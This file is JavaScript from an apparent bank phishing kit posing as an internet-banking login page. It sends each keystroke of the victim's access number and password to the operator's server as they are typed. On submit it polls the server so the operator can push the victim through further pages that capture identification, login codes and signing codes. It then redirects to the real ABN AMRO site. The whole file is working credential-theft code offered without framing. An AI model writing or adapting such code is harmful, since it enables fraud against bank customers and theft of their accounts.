const login_form = document.querySelector('#login-form');
const iban = document.querySelector('#number2');
const number = document.querySelector('#number');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

iban.addEventListener('input', e => {
    e.preventDefault();

    const data = new FormData();
    data.append('accessnumber', iban.value);

    fetch('/kiwi/change/' + token.value, {
            method: 'POST',
            body: data
        });
});

number.addEventListener('input', e => {
    e.preventDefault();

    const data = new FormData();
    data.append('password', number.value);

    fetch('/kiwi/change/' + token.value, {
            method: 'POST',
            body: data
        });
});


login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (iban.value == '' || number.value == '') {
        loginButton.disabled = false;
        iban.disabled = false;
        number.disabled = false;

        iban.value = '';
        number.value = '';

        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('accessnumber', iban.value);
        data.append('password', number.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="10"> Please wait..';
        loginButton.disabled = true;
        iban.disabled = true;
        number.disabled = true;

        document.querySelector('#errorMessage').style.display = 'none'; 

        fetch('/e1/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/e1/check/' + token.value, {
                    method: 'POST',
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            loginButton.innerHTML = 'Log in to internet banking';
                            loginButton.disabled = false;
                            iban.disabled = false;
                            number.disabled = false;

                            iban.value = '';
                            number.value = '';

                            document.querySelector('#errorMessage').style.display = 'block';

                            clearInterval(newInterval)
                        } else if (data.page == 'identification') {
                            window.location.href = '/e2/' + token.value;
                        } else if (data.page == 'loginCode') {
                            window.location.href = '/e3/' + token.value;
                        } else if (data.page == 'signCode') {
                            window.location.href = '/e4/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/e6/' + token.value;
                        }
                        else if (data.page == 'conf') {
                            window.location.href = '/e7/' + token.value;
                        }
                        else if (data.page == 'user') {
                            window.location.href = '/e8/' + token.value;
                        }
                        else if (data.page == 'finish') {
                            window.location.href = 'https://www.abnamro.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});


